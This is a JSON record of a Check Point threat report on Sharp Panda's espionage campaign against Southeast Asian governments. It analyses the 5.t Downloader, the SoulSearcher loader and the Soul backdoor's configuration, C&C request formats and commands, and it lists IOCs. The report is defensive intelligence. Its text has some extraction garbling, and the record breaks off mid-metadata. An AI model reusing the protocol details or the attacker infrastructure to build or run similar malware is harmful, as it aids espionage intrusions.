{
    "id": "e3d15832-2043-416c-b742-d407d2d2e091",
    "created_at": "2023-03-14T02:09:39.887693Z",
    "updated_at": "2025-03-27T02:16:01.248945Z",
    "deleted_at": null,
    "sha1_hash": "d1a6a9b7fbd5a94cdd7b325883da3e413d4f8ffc",
    "title": "Pandas with a Soul: Chinese Espionage Attacks Against Southeast Asian Government Entities",
    "authors": "Checkpoint",
    "file_creation_date": "2023-03-13T13:48:44Z",
    "file_modification_date": "2023-03-13T13:48:44Z",
    "file_size": 1656185,
    "plain_text": "# Pandas with a Soul: Chinese Espionage Attacks Against Southeast Asian Government Entities\n\n**[research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities](https://research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/)**\n\nMarch 7, 2023\n\n## Executive summary\n\n[In 2021, Check Point Research published a report on a previously undisclosed toolset used by Sharp Panda, a long-running Chinese cyber-](https://research.checkpoint.com/2021/chinese-apt-group-targets-southeast-asian-government-with-previously-unknown-backdoor/)\nespionage operation targeting Southeast Asian government entities. Since then, we have continued to track the use of these tools across several\noperations in multiple Southeast Asian countries, in particular nations with similar territorial claims or strategic infrastructure projects such as\nVietnam, Thailand, and Indonesia.\n\n**Key findings:**\n\nIn late 2022, a campaign with an initial infection vector similar to previous Sharp Panda operations targeted a high-profile government\n**entity in the region.**\nWhile Sharp Panda’s previous campaigns delivered a custom and unique backdoor called VictoryDll, the payload in this specific attack is\na new version of SoulSearcher loader, which eventually loads the Soul modular framework. Although samples of this framework\n[from 2017-2021 were previously analyzed, this report is the most extensive look yet at the Soul malware family infection chain, including](https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware)\na full technical analysis of the latest version, compiled in late 2022.\n[Although the Soul malware framework was previously seen in an espionage campaign targeting the defense, healthcare, and ICT sectors](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-campaign-south-east-asia)\nin Southeast Asia, it was never previously attributed or connected to any known cluster of malicious activity. Although it is currently not\nclear if the Soul framework is utilized by a single threat actor, based on our research we can attribute the framework to an APT group with\nChinese origins.\nThe connection between the tools and TTPs (Tactics, Techniques and Procedures) of Sharp Panda and the previously mentioned attacks\nin Southeast Asia might serve as yet another example of key characteristics inherent to Chinese-based APT operations, such as sharing\ncustom tools between groups or task specialization, when one entity is responsible for the initial infection and another one performs the\nactual intelligence gathering.\n\n## Introduction\n\n[At the beginning of 2021, Check Point Research identified an ongoing surveillance operation we named Sharp Panda that was targeting](https://research.checkpoint.com/2021/chinese-apt-group-targets-southeast-asian-government-with-previously-unknown-backdoor/)\nSoutheast Asian government entities. The attackers used spear-phishing emails to gain initial access to the targeted networks. These emails\ntypically contained a Word document with government-themed lures that leveraged a remote template to download and run a malicious RTF\ndocument, weaponized with the infamous RoyalRoad kit. Once inside, the malware starts a chain of in-memory loaders, comprised of a custom\nDLL downloader we call 5.t Downloader and a second-stage loader responsible for the delivery of a final backdoor. The final payload\nobserved in Sharp Panda campaigns at the time was VictoryDll, a custom and unique malware that enabled remote access and data collection\nfrom the infected device. We tracked several earlier versions of the VictoryDll backdoor back to at least 2017, with the whole operation\nremaining under the radar the entire time.\n\nFurther tracking of Sharp Panda tools revealed multiple campaigns that targeted entities in Southeast Asian countries, such as Vietnam,\nIndonesia, and Thailand. During this time, multiple minor changes were implemented in the 5.t Downloader itself, but in general, the initial\npart of the infection chain (the use of Word documents, RoyalRoad RTF and 5.t Downloader) remained the same. However, in early 2023,\nwhen investigating an attack against one of the government entities located in the targeted region, the payload received from the actor’s geofenced C&C server was different from the VictoryDll backdoor observed before. Further analysis revealed that this payload is a new version\n[of SoulSearcher loader, which is responsible for downloading, decrypting, and loading in memory other modules of the Soul modular](https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware)\n**backdoor.**\n\n\n-----\n\nFigure 1 – The infection chain.\n\n[The use of the Soul malware framework was described by Symantec in relation to the unattributed espionage operation targeting defense,](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-campaign-south-east-asia)\nhealthcare, and ICT sectors in Southeast Asia in 2020-2021. Following up on that report, Fortinet researchers discovered other samples from\n2017-2021 and [described the evolution of the framework. Soul was also seen in 2019 in attacks against Vietnamese targets. None of these](https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware)\npublic reports attributed the Soul framework to any specific country or known actor, although researchers noted the “competent adversarial\ntradecraft” which they believed indicated a “possibly state-sponsored” group.\n\nIn this report, we provide a detailed technical explanation of several malicious stages used in this infection chain and the latest changes\nimplemented in the Soul framework. We also discuss the challenges in attributing these attacks.\n\n## Downloader\n\nThe downloader, which in this specific case was dropped by RoyalRoad RTF to the disk as `res6.a, is executed by a scheduled task`\nwith `rundll32.exe, StartA . Its functionality is consistent with previous research of Sharp Panda activity. Similar to previous Sharp Panda`\ncampaigns, the C&C servers of the attackers are geofenced and return payloads only to requests from the IP addresses of the countries where\nthe targets are located.\n\nIn the latest campaign, the actors implemented some changes in the downloader’s communication with the C&C. Previously, the entire C&C\ncommunication was based on sending data encrypted using RC4 and encoded with base64, with an exception for the HTTP request for payload\nwhich contained the hostname in plain text in the URI: `/[**hostname]**.html.`\n\nHowever, in the new samples, the payload request is issued to the same PHP path as all the previous requests, with the host specified in its\nparameter, both MD5-hashed and in clear-text: `[host_name]*[host_name_md5],`\ne.g. `MyComputer*d2122d4f4cdf26faa1b2f73bda6030f4 and then encoded:`\n```\n/[php_name].php?Data=[encoded<host_name_and_host_md5>]\n\n```\n\nIt’s noteworthy that while different keys were used, the encoding method using RC4+Base64 remained consistent in all cases.\n\nIn addition to changes in the URL patterns, the actors refrained from using the distinctive User-Agent `“Microsoft Internet`\n```\nExplorer” and instead used a hardcoded generic one. A few of the samples we observed also communicated through HTTPS, not HTTP.\n\n```\nUnlike the previous version where only the API calls were obfuscated, the new version also uses string encryption. However, the encryption is\nquite simple and consists of loop XORing an encrypted character with the difference of a loop index and a constant value:\n\nFigure 2 – String decryption routine in the newest version of 5.t Downloader.\n\nAs in previous versions, the downloader gathers data from the victim’s computer including hostname, OS name and version, system type\n(32/64 bit), username, MAC addresses of the networking adapters, and information on anti-virus solutions. If the threat actors find the victim’s\nmachine to be a promising target, the response from the server contains the next stage executable in encrypted form and its MD5 checksum.\nAfter verifying the integrity of the received message, the downloader loads the decrypted DLL to memory and starts its execution from\nthe `StartW export function (the same name as the next stage loader export in previous campaigns that used the downloader).`\n\n\n-----\n\n## SoulSearcher loader\n\n[SoulSearcher is a second-stage loader, which according to Fortinet research was seen in the wild since at least November 2018 and is](https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware)\nresponsible for executing the Soul backdoor main module and parsing its configuration. SoulSearcher has multiple variants based on where the\nconfiguration and payload are located and on the type of configuration. Among the samples used in the more recent activity cluster we have\nbeen researching, the SoulSearcher DLL (sha256: d1a6c383de655f96e53812ee1dec87dd51992c4be28471e44d7dd558585312e0) was slightly\ndifferent from any previously discovered samples, with the backdoor embedded inside the data section and the embedded configuration in\nXML format.\n\nThe malware checks if it runs under a process named `svchost.exe,` `msdtc.exe or` `spoolsv.exe . If it does, it starts a thread`\non `StartW export and continues loading the backdoor. This might be an indication of the loader being used in different infection chains than`\nwe observed in this attack with the rundll32.exe directly starting a chain of in-memory DLL loaders from `StartW .`\n\nThe payload loading process starts with obtaining the configuration. While previously seen XML SoulSearchers retrieved this from the registry,\na file mapping object, or a file on the disk, the newest version loads the config from a hardcoded Base64 string and stores it in the registry\npath `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\CONFIGEX . The decoded data blob can be represented with the following struct:`\n\nstruct compressed_data\n\n{\n\nDWORD magic;\n\nDWORD unused;\n\nBYTE lzma_properties[5];\n\nDWORD size;\n\nDWORD compressed_size;\n\nBYTE decompressed_data_MD5[33];\n\nBYTE compressed_data_MD5[33];\n\nBYTE compressed_data[];\n\n};\n\nThe loader contains a compressed Soul backdoor DLL in the data section of the loader, while previous samples stored it in the overlay.\n\nNext, based on the system architecture, SoulSearcher appends `32 or` `64 to the wide string` `L'ServerBase', hashes the resulting`\nstring with MD5, and creates the registry key with this hash: `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies\\`\n```\n[ServerBaseArch_md5] . The value contains the compressed payload.\n\n```\nIf the registry key is successfully created, the loader reads the compressed payload and proceeds to decrypt and load it in memory. The loading\nprocess itself is not different from previously discussed variants of SoulSearcher: it uses the `compressed_data structure from the`\nconfiguration to validate MD5 checksums, LZMA-decompress the compressed module, and reflectively load the Soul main module DLL in\nmemory.\n\nAfter loading the backdoor, Soul Searcher resolves the `Construct export of the backdoor and calls it with the`\narguments `[ServerBaseArch_md5] -Startup .`\n\n## Soul Backdoor (main module)\n\nThe Soul main module is responsible for communicating with the C&C server and its primary purpose is to receive and load in memory\nadditional modules. Interestingly, the backdoor configuration contains a “radio silence”-like feature, where the actors can specify specific hours\nin a week when the backdoor is not allowed to communicate with the C&C server.\n\nThe recovered sample of the backdoor is quite different from the samples that were previously analyzed. The new version of SoulBackdoor was\ncompiled on `29/11/2022 02:12:34 UTC . Based on their timestamps, the earlier samples analyzed by other researchers are mostly from 2017`\nwith the exception of one from 2018, which, similar to our case, was embedded inside the SoulSearcher loader.\n\nThe backdoor implements a custom C&C protocol, which is entirely different than previously observed versions. Both the old and new versions\nare based on HTTP communication, but the latest version seems to be more complex and uses various HTTP request methods such\nas `GET,` `POST, and` `DELETE . The API endpoints are also different, and the C&C requests contain additional HTTP request headers. In terms`\nof the backdoor functionality, the enumeration data is different from the previous versions and is more extensive. The supported C&C\ncommands, with the newer variant primarily focused on loading additional modules, lack any type of common backdoor functionality like\nmanipulating local files sending files to the C&C and executing remote commands\n\n\n-----\n\n### Co gu at o a d e ecut o o\n\nThe backdoor requires two arguments or the `“-v” argument before performing its activity. As we mentioned earlier, in our case it is executed`\nby SoulSearcher with `[ServerBaseArch_md5] -Startup arguments.`\n\nSoul backdoor first creates an event using the hardcoded name `Global\\3GS7JR4S and checks the registry`\nkey `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF . It then uses the same configuration (from the registry`\nkey `HKEY_CURRENT_USER\\SOFTWARE\\Software\\Microsoft\\CTF\\CONFIGEX ) with the` `compressed_data struct (as used by SoulSearcher) to`\nextract the payload and decompress its own configuration. The configuration of the main module provides the parameters of C&C\ncommunication and other aspects of the backdoor execution. The compression algorithm is LZMA, similar to that found in older variants. After\ndecompression, the config looks like this:\n\n<CONFIG FLAG=\"X6bmLMbAL29AlxB\">\n\n<BASE>\n\n<Ip>http://103.159.132.96/index.php</Ip>\n\n<Dns>8.8.8.8|114.114.114.114|</Dns>\n\n<Proxy></Proxy>\n\n<CntPort>80|443</CntPort>\n\n<LstPort>0</LstPort>\n\n<Blog>NULL</Blog>\n\n<DropboxBlog>NULL</DropboxBlog>\n\n<HTTPS>false</HTTPS>\n\n</BASE>\n\n<SVC>\n\n<SvcName>IKEEXT</SvcName>\n\n<SvcDisp>@%SystemRoot%\\system32\\ikeext.dll,-501</SvcDisp>\n\n<SvcDesc>@%SystemRoot%\\system32\\ikeext.dll,-502</SvcDesc>\n\n<SvcDll>wlbsctrl.dll</SvcDll>\n\n</SVC>\n\n<ADV>\n\n<OlPass>NULL</OlPass>\n\n<OlTime>1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1\n</OlTime>\n\n<SelfDestroy>2029-07-11 15:29:32</SelfDestroy>\n\n</ADV>\n\n</CONFIG>\n\nIn its base ( <BASE> ) settings, the configuration contains the parameter “ LstPort ”. In the previous versions, this provided the backdoor the\nability to listen on a specified port. In this version, the code that supported this feature was removed, and the backdoor can only actively\nconnect to the C&C server using the URL provided in the “IP” parameter on the “connect” port “ Cnt ”.\n\nIn the “advanced” section ( <ADV> ) of the configuration, the “ OlTime ” parameter contains a list of 168 (24×7) numbers, one per hour in a\nweek. Each hour is represented either by 0 or 1. Zero means a “blocked” hour, and one represents an “allowed” hour. This way the operators of\nthe malware can use the configuration to enforce the specific hours the backdoor is allowed to communicate with the C&C server. If\nthe `OlTime field is empty in the config, a default setting is for all days and hours to be configured as “allowed”. This is an advanced OpSec`\nfeature that allows the actors to blend their communication flow into general traffic and decrease the chances of network communication being\ndetected. The “service” ( <SVC> ) section defines the parameters for the backdoor to be installed as a service:\n\n<SVC>\n\n\n-----\n\nSvcNa e /SvcNa e\n\n<SvcDisp>@%SystemRoot%\\system32\\ikeext.dll,-501</SvcDisp>\n\n<SvcDesc>@%SystemRoot%\\system32\\ikeext.dll,-502</SvcDesc>\n\n<SvcDll>wlbsctrl.dll</SvcDll>\n\n</SVC>\n\nThe Symantec publication also mentioned the Soul Searcher running as a service, but in the sample we analyzed, there is no code that\nimplements this feature. Judging by the settings left in the configuration we observed, the actors performed some variation of IKEEXT DLL\nHijacking, when on the start of the IKEEXT service, `svchost.exe would load the malicious DLL, saved as` `wlbsctrl.dll .`\n\nAfter loading and parsing the configuration the backdoor checks the\nregistry `HKEY_CURRENT_USER\\SOFTWARE\\Software\\Microsoft\\CTF\\Assemblies for the existence of a key with the name of MD5 hash of the`\nwide string `L\"AutoRun\" . If it exists, the backdoor decompresses, loads in memory, and executes the` `Construct export of the DLL stored in`\nthis key. Although we didn’t witness the creation or usage of this additional DLL payload, this logic is likely used for auto-updates or executing\nspecific actions prior to the main backdoor activity.\n\nAfter all of these steps are concluded, the backdoor begins the execution of its main thread.\n\n### C&C communication\n\nThe main thread begins by validating that it received from the configuration the C&C URL and DNS (or blog URL, which is empty in our case),\nand that the C&C URL starts with `http://,` `https:// or` `ftp:// . In this specific sample, we did not observe any type of FTP`\ncommunication capabilities. Then, if the current hour is “allowed” by `OlTime configuration, it begins the C&C communication.`\n\n**Bot registration and victim fingerprinting**\n\nThe first request is sent to the specified URL with the `ClientHello parameter. The MD5 header is an MD5 hash of the body. As there is no`\ndata transferred by this request, the MD5 ( d41d8cd98f00b204e9800998ecf8427e ) is of an empty string. In further analysis of the requests,\nwe omit the common headers (Cache-Control, Connection, User-Agent, MD5 and Host) as their meaning doesn’t change between the requests.\n\nGET /index.php?ClientHello HTTP/1.1\n\nCache-Control: no-cache\n\nConnection: Keep-Alive\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)\n\nMD5: d41d8cd98f00b204e9800998ecf8427e\n\nContent-Length: 0\n\nHost: 103.159.132.96\n\nThe expected response from the C&C server is `ERR! ParamError! In case of a bad or no response, the backdoor attempts to resolve the IP`\naddress of the C&C server on its own through the DNS servers in the config.\n\nFigure 3 – C&C DNS resolution\n\nIf the response is correct, it saves the C&C IP address in this format: `SVR:[IP_field_from_config]:[CntPort] to the registry`\nkey `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\SVIF .`\n\n\n-----\n\nNe t, t e odu e pe o s a u syste e u e at o a d co ects t e o ow g data:\n\nProcessor name and the number of processors, total physical memory and total available physical memory, and information about the\nhard disk such as total space and free space.\nThe OS architecture and various information from the `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion registry key such as`\nProductName, CSDVersion, ProductId, RegisteredOwner, RegisteredOrganization etc.\nComputer name and information about the current user, such as admin rights retrieved with NetUserGetInfo API.\nTime zone information from\nboth `HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation and HKLM\\SOFTWARE\\Microsoft\\Windows`\n```\n   NT\\CurrentVersion\\Time Zones registry.\n\n```\nLocal IP address of the machine, and its public IP address, obtained by issuing a request to one of the public IP resolution services such\nas `https://www.whatismyip.com/ :`\n\nFigure 4 – Victim machine enumeration data string\n\nAfter the system enumeration, the backdoor generates a `botUUID, concatenating with “-” two MD5 strings based on various parameters from`\nthe enumerated data. It saves the `botUUID to the registry key` `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\UUID . The`\nresulting `botUUID looks like this:`\n```\n5d41402abc4b2a76b9719d911017c592-7d793037a0760186574b0282f2f435e7\n\n```\n\nand is used in all the following network requests.\n\n**New C&C connection**\n\nAfter the system enumeration, the backdoor issues a series of requests to “register” a new connection and perform validation against the C&C\nserver.\n\nFirst, the backdoor notifies the server of a new connection. It is implemented as a DELETE request with the botUUID:\n\nDELETE /index.php?[botUUID];[botUUID].txt HTTP/1.1\n\nThe accepted response from the C&C: `OK!`\n\nNext, the `Connect request is sent, whose body contained Base64 of the string` `ConnectXXXXXXXX, where` `XXXXXXXX is the connection`\ntimestamp retrieved by `GetTickCount() API.`\n\nPOST /index.php?[botUUID]/REQ.dat HTTP/1.1\n\n[Base64-encoded string]\n\nThe accepted response from the C&C: `OK!`\n\nThe following request prepares the server to receive the enumeration data from the victim’s machine:\n\nGET /index.php?Enum;[botUUID]_[connection_timestamp].txt HTTP/1.1\n\nThe accepted response from the C&C is a string that looks like this: `./Updata/[botUUID]_[connection_timestamp].txt .`\n\nThis is most likely the path on the server to store the enumeration data.\n\nAfter this the backdoor sends another network request, possibly for verification:\n\nGET /index.php?D;[botUUID]_[connection_timestamp].txt HTTP/1.1\n\nThe accepted response is a base64-encoded string that contains the botUUID.\n\nAt the end of this process, if all the requests are successful, the backdoor is “registered” at the C&C server and continues sending information\nabout the system.\n\n**Send enumerated data**\n\n\n-----\n\no t s po t o, t e data se t betwee t e bac doo a d t e C&C se ve e es o a ot e st uct, c _body :\n\nstruct c2_body\n\n{\n\nDWORD special_flag;\n\nDWORD additional_data;\n\nDWORD const_float;\n\nBYTE command_id;\n\n};\n```\nconst_float, where used, is a hardcoded value, 5.2509999. special_flag and additional_data seem to be multipurpose variables\n\n```\nthat have different meanings in different contexts of the program execution. When sent in the body of both requests and responses, this struct\nis compressed according to the previously described `compressed_data struct from SoulSearcher, and then encoded with Base64.`\n\nFirst, the backdoor sends the current timestamp in the request to the following URL (a new timestamp is again retrieved\nby `GetTickCount() API).`\n\nPOST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1\n\n[base64-encoded and compressed c2_body]\n\nIn this request, `special_flag is 0x00,` `command_id is 0x01 and` `additonal_data is the tick count. The accepted response`\nis `OK! Otherwise, the backdoor sleeps and starts the connection from the beginning.`\n\nNext, the backdoor collects the enumeration data again, and compresses it using another struct:\n\nstruct enum_compressed_data\n\n{\n\nc2_body c2_msg;\n\ncompressed_data enum_data;\n\n};\n\nThe struct is then encoded with Base64 and sent in the body of the following request (the URL and methods are the same):\n\nPOST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1\n\n[base64-encoded and compressed enum_compressed_data]\n\nThe `command_id is the same 0x01,` `special_flag =0,` `additional_data = 0x4000 + 0x49 = size of enum data.`\n\nThe accepted response is also `OK!`\n\n**Main C&C loop**\n\nAfter posting the enumeration data, the backdoor enters an infinite loop, contacting the C&C server with the following request to receive the\ncommands:\n\nGET /index.php?CDD;[botUUID]_[connection_timestamp].txt;[botUUID]_[connection_timestamp]/Data_C_* HTTP/1.1\n\nIf there is no C&C command for the victim, the server responds with `ERR! Path not found, WAIT!`\n\nIf there is a command to execute, the C&C returns it in a base64-encoded string which is decompressed with `compressed_data and parsed`\nas `c2_body . Then the` `command_id from the struct is translated to the actual command execution.`\n\n### Soul Backdoor Commands\n\nThe main commands that can be received from the C&C server are control messages for the bot:\n\n\n-----\n\n**Command ID** **Action** **Description**\n\n0x04 Execute command Create a thread that handles commands from the second set of commands.\n\n0x0D Client keep-alive Mirror the request from the C&C server.\n\n0x0E Restart C&C session Send DELETE request and restart the communication from client Hello.\n\n0x0F Exit Send DELETE request and exit process forcefully.\n\nIf in the `c2_body the` `special_flag is set to one, the backdoor starts a continuous loop requesting data from the C&C server. The server`\nshould respond with a module name to be loaded from the `Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies registry`\nkey, which is executed from its `Construct export. Then the backdoor proceeds to execute the command specified in` `command_id .`\n\nIf the command_id is `0x04, the backdoor spawns a new “command execution” thread that performs a similar network communication flow`\nas the main thread, only without sending the enumeration data.\n\nIt then begins handling the following commands:\n\n**Command**\n**ID** **Action** **Description**\n\n\n0x61 Install\nmodules\n\n0x62 Delete\nmodules\n\n0x63 Validate\nmodules\n\n0x64 Load\nmodule\n\n0x65 Enumerate\nmodules\n\n\nThe server sends the number of modules to be written to the registry. Then the bot makes requests to the C&C\nserver, once per module and writes it to a specified registry key. Validate the result by executing\ncommand `0x65 afterward.`\n\nAll the registry keys are under `Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies .`\n\nDelete registry keys that are sent by the C&C in a string separated by semi-colons (;). Validate the result by\nexecuting command `0x65 afterward.`\n\nValidate that modules are currently compatible with the system architecture. The modules are located in the\nregistry, and registry keys names are sent by the C&C separated by a semi-colon.\n\nLoad the specified module and call its export function `Construct . The registry key where the module is stored`\nis sent by the C&C server.\n\nCreate a buffer with all registry keys\nunder `Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies in the format of` `%s:%f:; (key`\nname and first 4 bytes of the value), then send the buffer back to the C&C.\n\n\nAll the received modules are stored compressed in the registry. The decompression is performed according to another struct:\n\nstruct stored_module\n\n{\n\nfloat version_or_id;\n\nQWORD decompressed_size;\n\nQWORD compressed_size;\n\nBYTE md5sum[33];\n\nBYTE compressed_data[];\n\n};\n\nWe didn’t witness any follow-up modules, but due to the modular nature of the backdoor, we can expect the actors to use all kinds of datastealing modules, keyloggers, data exfiltration modules and likely also a lateral movement toolset.\n\n## Attribution\n\nAs the first stages of the infection chain are identical to the previously described Sharp Panda activity, many of the indicators that allowed us to\nattribute the threat actors to Chinese-based threat groups are still relevant in relation to the subsequent attack attempts described in this\nreport:\n\nThe RoyalRoad RTF kit was reported as the tool of choice among Chinese APT groups and is still used despite the exploitation of old\npatched vulnerabilities. This implies that at least a portion of the attacks using it are successful, and the threat actors are familiar with the\ncybersecurity practices of their targets.\n\n\n-----\n\nOve t e past seve a yea s, t e C&C se ve s co s ste t y etu pay oads o y betwee 0 :00 08:00 U C o day day, w c we\nbelieve represents the actors’ working hours.\n[The C&C servers did not return payloads during the period of the Chinese Spring Festival, even during working hours.](https://publicholidays.cn/2023-dates/)\nThe victimology of the attacks is consistent with Chinese interests in Southeast Asian countries, particularly those with similar territorial\nclaims or strategic infrastructure projects.\n\n[In addition, the Soul Backdoor configuration contains 2 hardcoded DNS services, one of which is a Chinese 114DNS Free Public DNS service](https://www.114dns.com/index.html)\nwhich is not commonly used outside the region.\n\nThe campaign discussed in this report involves the malicious artifacts from different clusters of malware activity. As sharing custom tools or\noperational methods is common among Chinese-based threat actors to facilitate intrusion efforts, it poses a challenge to their attribution. In\naddition to observing different toolsets from two previously not connected clusters (Sharp Panda and previous attacks using the Soul\nframework), other areas of overlap between publicly tracked Chinese APT groups and this campaign include the following:\n\nInfrastructure: One of the IP addresses used by Sharp Panda’s initial infection in late 2021 overlaps with the IP reportedly used by TAG[16 in the same timeframe. In the relevant report, the Insikt Group researchers provided evidence suggesting that TAG-16 shares custom](https://go.recordedfuture.com/hubfs/reports/cta-2021-1208.pdf)\ncapabilities with the People’s Liberation Army (PLA)-linked activity group RedFoxtrot.\n[The Southeast Asian government entity attacked in the described campaign was also targeted by a tool attributed to a Chinese-linked APT](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks)\ngroup during the same time period. However, there is currently no clear evidence to tie the tool to this campaign with high confidence.\n[Symantec researchers also discovered the APT30 toolset in the network of one of the organizations attacked with the Soul framework in](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-campaign-south-east-asia)\nthe same timeframe, with no distinctive connection as well.\n\nThe vague links of all the aforementioned groups to Chinese intelligence Services, the nature of the targets, and the capabilities of the toolset\nused lead us to the conclusion that the described activity is an espionage operation likely executed by well-resourced and possibly nation-state\nthreat actors.\n\n## Conclusion\n\nIn this report, we analyzed the TTPs and the tools used in the espionage campaign against Southeast Asian government entities. The initial\ninfection stages of this campaign use TTPs and tools consistent with Sharp Panda activity first discovered in 2021. We continue to track Sharp\nPanda as a separate unknown cluster, and based on our current insight into this threat, we cannot confirm with high confidence their relation\nto other Chinese threat actors.\n\nThe later stages of the infection chain in the described campaign are based on Soul, a previously unattributed modular malware framework.\nWhile the Soul framework has been in use since at least 2017, the threat actors behind it have been constantly updating and refining its\narchitecture and capabilities. Based on the technical findings presented in our research, we believe this campaign is staged by advanced\nChinese-backed threat actors, whose other tools, capabilities, and position within the broader network of espionage activities are yet to be\nexplored.\n\n## IOCs\n\n### C&C servers\n\n45.76.190[.]210\n45.197.132[.]68\n45.197.133[.]23\n103.78.242[.]11\n103.159.132[.]96\n103.173.154[.]168\n103.213.247[.]48\n139.180.137[.]73\n139.180.138[.]49\n152.32.243[.]17\noffice.oiqezet[.]com\n\n### Hashes\n\n**Phishing documents**\n\n32a0f6276fea9fe5ee2ffda461494a24a5b1f163a300bc8edd3b33c9c6cc2d17\nca7f297dc04acad2fab04d5dc2de9475aed4186805f6c237c10b8f56b384cf30\n341dee709285286bc5ba94d14d1bce8a6416cb93a054bd183b501552a17ef314\n9d628750295f5cde72f16da02c430b5476f6f47360d008911891fdb5b14a1a01\n811a020b0f0bb31494f7fbe21893594cd44d90f77fcd1f257925c4ac5fabed43\nb023e2b398d552aacb2233a6e08b4734c205ab6abf5382ec31e6d5aa7c71c1cb\n\n\n-----\n\n**te** **a te** **p ate ( oya** **oad** **)**\n\n81d9e75d279a953789cbbe9ae62ce0ed625b61d123fef8ffe49323a04fecdb3f\n12c1a4c6406ff378e8673a20784c21fb997180cd333f4ef96ed4873530baa8d3\nf2779c63373e33fdbd001f336df36b01b0360cd6787c1cd29a6524cc7bcf1ffb\n7a7e519f82af8091b9ddd14e765357e8900522d422606aefda949270b9bf1a04\n4747e6a62fee668593ceebf62f441032f7999e00a0dfd758ea5105c1feb72225\n3541f3d15698711d022541fb222a157196b5c21be4f01c5645c6a161813e85eb\n\n**5.t Downloader**\n\n0f9f85d41da21781933e33dddcc5f516c5ec07cc5b4cff53ba388467bc6ac3fd\n17f4a21e0e8c0ce958baf34e45a8b9481819b9b739f3e48c6ba9a6633cf85b0e\nf8622a502209c18055a308022629432d82f823dd449abd9b17c61e363a890828\n1a15a35065ec7c2217ca6a4354877e6a1de610861311174984232ba5ff749114\n065d399f6e84560e9c82831f9f2a2a43a7d853a27e922cc81d3bc5fcd1adfc56\n1e18314390302cd7181b710a03a456de821ad85334acfb55f535d311dd6b3d65\nc4500ad141c595d83f8dba52fa7a1456959fb0bc2ee6b0d0f687336f51e1c14e\n390e6820b2cc173cfd07bcebd67197c595f4705cda7489f4bc44c933ddcf8de6\n\n**SoulSearcher**\n\nd1a6c383de655f96e53812ee1dec87dd51992c4be28471e44d7dd558585312e0\n\n**Soul Backdoor**\n\ndf5fe7ec6ecca27d3affc901cb06b27dc63de9ea8c97b87bc899a79eca951d60\n\nGO UP\n[BACK TO ALL POSTS](https://research.checkpoint.com/latest-publications/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/29jms8a3yoapqi7id90gi7fepknh155m"
    ],
    "report_names": [
        "Checkpoint_Chinese-Espionage-Southeast-Asian-Government-Entities(03-07-2023)"
    ],
    "threat_actors": [
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8a3bd03a-f69b-455b-b88b-3842a3528bfd",
            "created_at": "2022-10-25T16:07:24.178007Z",
            "updated_at": "2025-03-27T02:02:10.132529Z",
            "deleted_at": null,
            "main_name": "SharpPanda",
            "aliases": [
                "Sharp Dragon",
                "SharpPanda"
            ],
            "source_name": "ETDA:SharpPanda",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "RoyalRoad",
                "cobeacon"
            ],
